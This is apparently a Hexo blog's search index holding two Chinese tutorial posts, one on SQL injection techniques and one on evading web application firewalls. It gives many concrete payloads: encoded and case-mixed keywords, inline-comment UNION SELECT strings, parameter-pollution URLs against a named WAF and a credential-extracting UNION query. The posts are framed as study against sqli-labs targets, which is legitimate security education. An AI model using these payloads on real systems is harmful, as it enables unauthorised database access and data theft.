<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入绕waf</title>
      <link href="/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/"/>
      <url>/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入绕WAF介绍"><a href="#SQL注入绕WAF介绍" class="headerlink" title="SQL注入绕WAF介绍"></a>SQL注入绕WAF介绍</h2><p>WAF（ Web Application Firewall ）Web应用防火墙。是针对 HTTP&#x2F;HTTPS 的安全策略来专门为Web应用提供检</p><p>测和保护的一个网络安全产品。WAF可以增大攻击者的攻击难度和攻击成本。WAF会对我们在程序中输入 的参数</p><p>进行检测和过滤，当检测到危险的参数值时就会对我们进行拦截，甚至是IP封 禁。</p><p>而SQL注入绕WAF则是利用一些技巧绕过WAF的防御检测，以使SQL语句能成功的带入到数据库中执行。</p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><strong>汇总：</strong></p><ul><li>等价替换</li><li>大小写绕过</li><li>编码绕过</li><li>N写绕过</li><li>空格字符绕过</li><li>内联注释绕过</li><li>更改请求方式</li><li>分块传输</li><li>参数污染</li><li>缓冲区溢出</li><li>随机数混淆</li></ul><h3 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h3><p>在程序员开发过程中有可能会禁用一些函数或关键字而无法使用，因此可以通过等价或类似的函数或关键字来达到相同的效果</p><blockquote><p>and -&gt; &amp;&amp;</p><p>or -&gt; ||</p><p>not -&gt; !</p><p>xot -&gt; |</p><p>&#x3D;  -&gt;  like</p><p>不等于 -&gt; &lt;&gt;</p><p>group_concat() -&gt; concat_ws()</p><p>sleep() -&gt; benchmark()</p><p>hex()、bin() -&gt; ascii()</p><p>mid() 、substr() -&gt; substring()</p><p>updatexml 、extractvalue() -&gt; polygon()</p><p>‘admin’ -&gt; 0x61646D696E</p></blockquote><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>同等价替换一样，有些函数是在开发时写死，通过随机大小写的方式可以绕过WAF的字符对比检测。</p><p>此处展示为sqli靶场第27关源码</p><p><img src="./1757558440009.png" alt="1757558440009"></p><p>从源码知过滤了常见的sql注入所用函数，如select 、union</p><p>但是源码并未对用户输入做相关处理，因此可以利用禁用列表中没有的字符进行注入，如UnioN，SelEcT等</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>编码绕过的原理是，攻击者在注入时采用了一些特殊的字符编码方式，从而绕过WAF的检测过程。这种编码绕</p><p>过的思路就是利用特殊的字符编码方式，将恶意SQL语句转化为WAF规则无法匹配的形式。例如WAF通常会拦截union select，单个不拦截 ，一起就进行拦截；</p><p>常用编码切换</p><blockquote><p>空格 -&gt; %0a || %0A  -&gt; &#x2F;**&#x2F;</p><p>‘ -&gt; %27</p><p>&#x3D; -&gt; %3d</p></blockquote><p>常用编码格式</p><ul><li>URL编码</li><li>十六进制编码</li><li>base64编码</li><li>Unicode编码</li></ul><h4 id="1-针对单个关键字的绕过："><a href="#1-针对单个关键字的绕过：" class="headerlink" title="1.针对单个关键字的绕过："></a>1.针对单个关键字的绕过：</h4><p>○ sel ̝ ect 程序过滤 ̝ 为空 脚本处理 </p><p>○ sele&#x2F;**&#x2F;**ct 程序过滤&#x2F;&#x2F;为空 </p><p>○ ˺ !%53eLEct ˧ url编码与内联注释 </p><p>○ se%0blect 使用空格绕过 </p><p>○ sele%ct 使用百分号绕过 </p><p>○ %53eLEct 编码绕过</p><h4 id="2-单次编码"><a href="#2-单次编码" class="headerlink" title="2.单次编码"></a>2.单次编码</h4><p>即将语句做一次编码，前提数据是通过WAF到服务器解析执行的过程仅执行一次解码动作，否则会因过度解码而造成语句无法数据库识别。</p><p>一次编码通常仅编码特殊字符</p><blockquote><p>?id&#x3D;1 union select database()<br>编码后</p><p>?id&#x3D;1%20union%20select%20database()</p></blockquote><h4 id="3-双重编码"><a href="#3-双重编码" class="headerlink" title="3.双重编码"></a>3.双重编码</h4><p>即对于浏览器发送的数据进行了两次编码操作，如s做一次url编码是%73, 再进行一次编码是%25%37%33。一般情况下数据经过WAF设备的时候只会做一次url解码，这样解码之后的数据一般不会匹配到规则，达到bypass的效果。</p><blockquote><p>?id&#x3D;1 union select 1</p><p>第一次编码</p><p>?id&#x3D;1%20union%20select%201</p><p>第二次编码</p><p>?id&#x3D;1%2520union%2520select%25201</p></blockquote><h4 id="4-Unicode编码"><a href="#4-Unicode编码" class="headerlink" title="4.Unicode编码"></a>4.Unicode编码</h4><p>IIS服务器支持对于unicode的解析，例如我们对于select中的字符进行unicode编码，可以得到如下的s%u006c%u0006ect，这种字符在IIS接收到之后会被转换为select，但是对于WAF层，可能接收到的内容还是s%u006c%u0006ect，这样就会形成bypass的可能。</p><table><thead><tr><th>字符</th><th><strong>Unicode</strong>编码</th></tr></thead><tbody><tr><td>a</td><td>%u0000 %u0041 %u0061 %u00aa %u00e2</td></tr><tr><td>单引号</td><td>%u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27%c0%a7 %e0%80%a7</td></tr><tr><td>空白</td><td>%u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0</td></tr><tr><td>左括号(</td><td>%u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8</td></tr><tr><td>右括号)</td><td>%u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9</td></tr></tbody></table><h3 id="N写绕过"><a href="#N写绕过" class="headerlink" title="N写绕过"></a>N写绕过</h3><p>一般情况下是通过双写来绕过WAF检测，同样是开发时写死的禁用函数</p><p>有时后端或WAF检测到禁用函数或关键字会将该字符串从语句删除，以清除SQL注入的威胁</p><p>当系统仅检测一次时可以使用双写绕过</p><p>如：union可以写成ununionion，在这串字符串中WAF可能会将其中的union删除只会保留最外层的union</p><p>当WAF会进行多次删除时，可以对禁用字符串多次嵌套来绕过检测，但通常如果三写绕不过的情况，嵌套再多也没用，因为WAF可能会重复删除。</p><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p>有些WAF会检测语句中相关关键字之间的空格，那么我们通过替换的方式可以尝试绕过WAF</p><p>常见URL转码。  </p><blockquote><p> 空格 %20</p><p> %09 TAB键（水平）</p><p> %0a 换行</p><p> %0d 回车</p><p> %a0 空格  </p></blockquote><p>常见用法</p><blockquote><p> &#x2F;**&#x2F;代替空格 </p><p> ()代替空格</p><p> 回车（url编码中的%0a）</p><p> &#96;&#96;(两个反引号)</p><p> 两个空格代替一个空格</p><p> TAB  代替空格</p></blockquote><p>示例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line">#注意括号中不能含有<span class="operator">*</span></span><br><span class="line"><span class="keyword">select</span>(id)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="keyword">select</span> `id`<span class="keyword">from</span>`users`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>常用注释符</p><blockquote><p>&#x2F;&#x2F;, – , &#x2F;**&#x2F;, #, –+,–  -, ;，–a</p></blockquote><p> 内联注释符 <code>/**/ </code>。在MySQL中如果内联注释  <code>/*!*/</code> 这样编写那么注释里面的内容将会被执行。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!select database() */</span></span><br><span class="line">?<span class="keyword">user</span><span class="operator">=</span>admin<span class="string">&#x27; ˺ /*select database() */ ˯ +</span></span><br><span class="line"><span class="string">识别</span></span><br><span class="line"><span class="string">waf ：?id=1 /*</span></span><br><span class="line"><span class="string">sql : ?id=1 /*!select databae()*/</span></span><br></pre></td></tr></table></figure><p>内联注释就是把一些MySQL语句放在 &#x2F;<em>!…</em>&#x2F;中.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="comment">/*! !union select 1,2,3,4 */</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="comment">/*!union*/</span><span class="comment">/*!select ˧ 1,2,3,4*/</span>;</span><br></pre></td></tr></table></figure><p>内联注释常用方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--简单内联注释</span></span><br><span class="line">id<span class="operator">=</span><span class="number">100</span><span class="comment">/*!union*/</span><span class="keyword">select</span></span><br><span class="line"><span class="comment">--增加干扰符，绕过waf对内联注释的黑名单机制</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">-2</span><span class="comment">/*%!&quot;/*/</span><span class="keyword">union</span><span class="comment">/*%!&quot;/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">--多重内联注释绕过单层检测（类似双写）</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">100</span><span class="comment">/*!/*!union*/</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">select</span></span><br><span class="line"><span class="comment">--多个语句或单词运用内联注释</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">100</span><span class="comment">/*!/*!union*/</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="comment">/*!table_name*/</span> <span class="comment">/*!from*/</span> <span class="comment">/*!information_schema.tables where table_schema=database()*/</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment">--注释变量参数</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">-1</span><span class="operator">+</span><span class="keyword">UnIoN</span><span class="comment">/*&amp;s=*/</span><span class="keyword">sEleCT</span><span class="comment">/*&amp;s=*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span>,<span class="number">6</span>#</span><br></pre></td></tr></table></figure><h3 id="更改请求方式"><a href="#更改请求方式" class="headerlink" title="更改请求方式"></a>更改请求方式</h3><p>八种请求方式：</p><blockquote><p>GET、PUT、POST、DELECT、HEAD、OPTIONS、CONNECT、TRACE</p></blockquote><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>HEAD</td><td>类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>DELETE</td><td>请求服务器删除指定的页面。</td></tr><tr><td>CONNECT</td><td>HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>OPTIONS</td><td>允许客户端查看服务器的性能。</td></tr><tr><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr></tbody></table><p>更换提交方式：为上传文件数据包类型</p><p><img src="./1757573150157.png" alt="1757573150157"></p><p><img src="./1757573176678.png" alt="1757573176678"></p><h3 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h3><p>分块传输 （Chunked transfer encoding） 是超文本传输协议(http) 中的一种数据传输机制，允许将HTTP数据包分为多个部分发送出去。</p><ul><li>响应头设定：在HTTP请求头部，添加 Transfer-Encoding: chunked 来指明采用分块传输。</li><li>数据分块：数据被分割成一系列的小块（chunk）。每个块的格式如下：<ul><li>块大小：每个块以十六进制形式指定其大小（字节数），之后是回车和换行符（\r\n）。</li><li>数据块内容：接下来是实际的内容数据，再次用\r\n表示块的结束。</li><li>终止块：传输结束时，服务器发送一个大小为0的块，表示传输完成。</li></ul></li></ul><p>示例：要向服务器传输“Hello，World!”</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="operator">/</span> HTTP<span class="operator">/</span><span class="number">1.1</span></span><br><span class="line">Host: www.tommonkey.cn</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">131.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">131.0</span></span><br><span class="line">Transfer<span class="operator">-</span>Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>\r\n</span><br><span class="line">Hello\r\n</span><br><span class="line"><span class="number">7</span>\r\n</span><br><span class="line">, World<span class="operator">!</span>\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注：POST方式才能进行分块传输，尾部需要添加两个换行</p><h3 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h3><p>介绍：HTTP参数污染即HPP（HTTP Parameter Pollution） </p><p>浏览器在和服务器进行交互的过程中，浏览器往往会在 POST&#x2F;GET请求里面携带参数 ,这些参数会以 名称&#x3D;值 形式出现，通常在一个请求中，同样名称的参只会出现一次。但是HTTP协议时允许同样名称的参数出现多次的。</p><blockquote><p> id&#x3D;1&amp;id&#x3D;2</p></blockquote><p>如：<code>http://192.168.10.1/?id=1&amp;id=12</code> ,针对同名参数出现多次的情况，不同Web服务器处理的方式不一样，有些取第二个参数值，有的取第一个参数值，还有的服务器全取。这种特性在绕过一些服务端的逻辑判断时非常有用。</p><table><thead><tr><th>Web服务器</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET(“par”)</td><td>Last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(“par”)</td><td>First</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(“par”)</td><td>First</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(“par”)</td><td>All(list)</td></tr><tr><td>ASP&#x2F;IIS</td><td>Request.QueryString(“par”)</td><td>ALL(comma-delimited string)</td></tr></tbody></table><p>演示（php&#x2F;Apache）<code>http://192.168.174.147/hpp.php?id=1/&amp;id=-1 union select 1,2,3 %23/</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="./image.png" alt="null"></p><p>利用参数污染绕过安全狗</p><blockquote><p>http: ˾ 192.168.174.135&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 &#x2F;<em>&amp;id&#x3D;-1 union select 1,2,3 %23</em>&#x2F;</p></blockquote><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p><p>举例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span></span><br></pre></td></tr></table></figure><p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p><h3 id="随机数混淆"><a href="#随机数混淆" class="headerlink" title="随机数混淆"></a>随机数混淆</h3><p>采用随机数混淆的策略可以让Payload在每次注入时都不同，从而增加了WAF检测的难度。同时，由于随机数的不可预测性，攻击者可以借助随机的结果来判断注入是否成功，而WAF却无法识别这一点。</p><p>示例Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users WHERE id=1 AND 1=(SELECT RAND() &lt; 0.5) --</span></span><br></pre></td></tr></table></figure><p>使用RAND()函数生成0~1之间的随机数并与0.5比较，随机数小于0.5语句为：</p><blockquote><p>UNION SELECT username, password FROM users WHERE id&#x3D;1 AND 1&#x3D;1</p></blockquote><p>当生成的随机数大于等于0.5时，Payload会变成：</p><blockquote><p>UNION SELECT username, password FROM users WHERE id&#x3D;1 AND 1&#x3D;0</p></blockquote><p>对应代码执行成功和失败两种情况</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2025/09/08/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/09/08/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="information-schema内置库"><a href="#information-schema内置库" class="headerlink" title="information_schema内置库"></a>information_schema内置库</h2><blockquote><p>schemata 记录当前mysql下所有库名</p><p> tables 用来记录当前mysql下所有数据库下的表表名</p><p> columns 记录当前mysq下所有字段名的</p><p> schema_name 记录库名的字段</p><p> table_name 记录表名的字段</p><p> column_name 记录字段名的字段</p></blockquote><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>SQL注入是指Web应用程序对用户输入数据的合法性未进行判断、处理 。前端传入的参数是攻击者可控的 ，并且 参数被正常带入到数据库中执行 ，攻击者可以通过构造不同的SQL语句来对数据库进行操作，正常情况下，攻击者可以对数据库进行高危操作（例如，数据查询、WebShell写入、命令执行等操作）。</p><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><p>数据库信息泄露：泄露数据库中存放的数据、用户隐私等</p><p>获取数据库权限：当权限足够高时，可以获取系统主机权限</p><p>获取Webshell：当权限为root切纸刀绝对路径时，可以直接写入一句话木马到服务器</p><p>网页篡改：注入出后台管理员用户，登录后台发布恶意数据、篡改后台数据等</p><p>文件读取：读取敏感文件</p><p>万能密码：利用特定payload登陆后台或其他页面</p><h2 id="SQL注入的流程"><a href="#SQL注入的流程" class="headerlink" title="SQL注入的流程"></a>SQL注入的流程</h2><p>1、判断是否存在SQL注入，注入类型是字符型还是数字型</p><p>2、猜解SQL查询语句中的字段数</p><p>3、确定显示的字段回显位置</p><p>4、获取当前数据库</p><p>5、获取数据库中的表</p><p>6、获取表中的字段名</p><p>7、查询到账户的数据</p><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><blockquote><p>按注入点分类：POST注入、GET注入、Cookie注入、UA头注入等</p><p>按注入类型分类：数字型、字符型、搜索型</p><p>按手法分类：联合注入、报错注入、布尔盲注、时间盲注、堆叠注入、二次注入、宽字节注入、Cookie注入、DNSlog外带注入</p></blockquote><h3 id="SQL注入防御方式"><a href="#SQL注入防御方式" class="headerlink" title="SQL注入防御方式"></a>SQL注入防御方式</h3><blockquote><p>函数过滤，如!is_numeric 函数   &#x2F;&#x2F; 判断变量 id 是否为数字<br>直接下载相关防范注入文件，通过 incloud 包含放在网站配置文件里面，如 360、阿里云、腾迅提供的防注入脚本<br>使用白名单过滤<br>采用 PDO 预处理<br>使用 Waf 拦截</p></blockquote><p>PDO预处理可以防止 SQL 注入攻击： prepare 预处理语句可以有效地防 止 SQL 注入攻击，因为它会 将 SQL 查询字符串与参数分开处理 ，确保参数 不会被解释为 SQL 代码的一部分。这有助于保护数据库免受恶意用户的攻击。</p><h3 id="SQL注入手法"><a href="#SQL注入手法" class="headerlink" title="SQL注入手法"></a>SQL注入手法</h3><h4 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h4><p>即使用联合查询注入的一种方式，适用于有回显同时数据库软件版本是5.0以上得MySQL数据库（因为5.0后存在 内置库information_schema） 能够快速通过几条注入语句获取数据。 </p><p>使用条件：必须保证字段数一致，即两个查询结果有相同的列数，因此要对字段数进行判断，以及回显点的判断</p><p><strong>判断方式：</strong></p><blockquote><p>SELECT * FROM USERS WHERE ID&#x3D;1 UNION 1,2,3,4,5 </p></blockquote><p>or </p><blockquote><p>SELECT * FROM USERS WHERE ID&#x3D;1 ORDER BY n</p><p>&#x2F;&#x2F;通过n来判断列数，当n小于等于列数时页面回显正常，当n大于列数时，页面异常报数据库错误</p></blockquote><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>常见报错函数：</strong></p><blockquote><p>extractvalue()<br>updatexml()<br>floor()<br>exp()<br>linestring()<br>geometrycollection()<br>multipoint()<br>polygon()<br>multipolygon()<br>multilinestring()</p></blockquote><p>其中原理主要是 </p><ul><li><p>xpath语法错误 </p></li><li><p>BIGINT等数据类型溢出</p></li><li><p>count()+rand()+groupby() ·导致主键冲突</p></li></ul><blockquote><p>以<code>extractvalue()</code>和<code>updatexml()</code>为例：</p><p>两个函数都有<code>XML路径</code> ，而在路径中，插入特殊字符是非法得，也就会产<br>生报错，而当报错内容为SQL语句得时候，SQL那边得解析器会自动解析该SQL语句，就会造成<br>SQL语句得执行，从而触发SQL注入。</p></blockquote><p>floor()函数 是 MYSQL 中用来取整的函数</p><p>具体用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)#  </span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>在SQL注入过程中，SQL语句执行后数据不会回显到前端页面，也无报错时使用特殊方法进行判断、尝试的过程</p><blockquote><p>注：</p><p>1.页面没有回显信息<br>2.没有报错信息<br>3.但是有正常和异常两种情况 true flase</p></blockquote><p>相关函数：</p><blockquote><p>ascii() &#x2F; ord() 将某个字符串转化为ascii值<br>语句：select ascii(mid(user(),1));</p><p>Lenght() 返回字段&#x2F;结果的长度<br>语法：select length(user())</p><p>count() 聚合函数也称作计数函数，返回查询对象的总数<br>语法：select count(*) from student;</p><p>substr() 此函数是用来截取字符串一部分。<br>语法：select substr(user(),1,2);</p><p>concat()用于将数据合并输出。<br>语法：select concat(0x7e,batabase(),);</p><p>limit 限制查询数<br>limit 0,1 第一个数据</p></blockquote><p>一般布尔盲注过程为：</p><blockquote><p>1.使用BP抓包</p><p>2.构造Payload</p><p>3.爆破</p><p>4.通过爆破结果对比ASCII</p><p>5.复原数据</p></blockquote><p><img src="./image.png" alt="img"></p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>与布尔盲注类似，但是不同点是，无论SQL语句是否执行成功，页面依然无变化。此时只能通过页面加载时间进行判断构造的SQL语句是否执行成功。设置时间延迟，正确的延迟，错误则不会延迟来进行猜解，得到正确的闭合。继续利用设置时间延迟，正常的延迟，错误则不会延迟来进行猜测各种数据</p><blockquote><ol><li><p>没有回显数据</p></li><li><p>没有报错</p></li><li><p>没有正常和异常得页面</p></li></ol></blockquote><p>相关函数：</p><blockquote><p>sleep() 网页延迟n秒后，输出结果 </p><p>if(a,b,c) if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c; </p><p>ascii()函数&#x2F;ord()函数 将某个字符串转化为ascii值 </p><p>length()函数 获取字符串的长度 </p><p>substr()&#x2F;mid()函数 </p></blockquote><p>时间盲注过程与布尔盲注类似，仅判断SQL语句是否执行成功的方式不同</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>攻击者通过注入多个 SQL 语句到一个查询中，利用数据库支持堆叠查询的特性（即在同一条查询中执行多个 SQL 语句）来执行恶意操作。这类攻击利用了某些数据库管理系统（DBMS）允许多个 SQL 语句在一个查询中堆叠执行的特性，通常通过分号（<code>;</code>）分隔不同的 SQL 语句。</p><p>堆叠注入的目的是让攻击者在一个请求中执行多个 SQL 语句，从而绕过应用程序的某些限制，进行信息泄露、数据删除、数据修改或其他恶意操作。</p><p>与联合查询类似，仅是在查询语句后使用（<code>;</code>）拼接多条SQL语句</p><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>; <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables; <span class="comment">--&#x27; AND password = &#x27;[password_input]&#x27;;</span></span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p> 二次注入是指已存储到数据中的恶意数据，被用户读取后再次拼接到 SQL 查询语句 中并执行从而导致的注入。  </p><blockquote><p>1.将恶意语句插入到数据库</p><p>2.程序将恶意数据读取出来，并拼接新的SQL语句带入数据执行</p></blockquote><p> 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通 注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询；  </p><p>图解：</p><p><img src="./image-1757331250603.png" alt="null"></p><p>即：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。<br><strong>利用前提：</strong></p><blockquote><p>1.攻击者插入恶意语句时后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义</p><p>2.后端对数据库完全信任，直接使用数据库数据</p></blockquote><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p>当字符的大小为一字节时，称其为窄字节。</p><p>当字符得大小为两字节时，称其为宽字节。</p><p>所有英文默认占1个字节，汉字占两个字节。</p><p>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节</p></blockquote><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（两字节）的时候，会认为两个字符是一个汉字（前一个<a href="https://so.csdn.net/so/search?q=ascii%E7%A0%81&spm=1001.2101.3001.7020">ascii码</a>要大于128，才到汉字的范围）,在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误.</p><p>利用条件：</p><blockquote><p>1.数据库为GBK编码，后端为UTF-8编码<br>2.使用了转义函数，将POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p></blockquote><p><img src="./image-1757332404279.png" alt="null"></p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" 